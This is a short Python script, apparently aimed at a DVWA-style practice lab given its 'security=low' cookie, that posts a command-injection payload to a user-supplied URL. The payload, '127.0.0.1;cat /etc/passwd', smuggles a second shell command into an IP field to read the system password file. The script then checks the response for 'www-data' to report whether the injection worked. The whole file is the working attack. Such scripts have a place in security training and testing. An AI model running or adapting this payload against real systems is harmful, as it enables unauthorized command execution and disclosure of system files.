import requests
urll=input("url enter: ")
header={"Cookie": "security=low; PHPSESSID=a0b29e43b154e8cf261c3a93686bdd94"}
url=urll
data={"ip":"127.0.0.1;cat /etc/passwd","sumbit":"sumbit"}
sonuc=requests.post(url=url,data=data,headers=header)
if "www-data" in str(sonuc.content):
    print("Command injection found")
else:
    print("command injection not found")
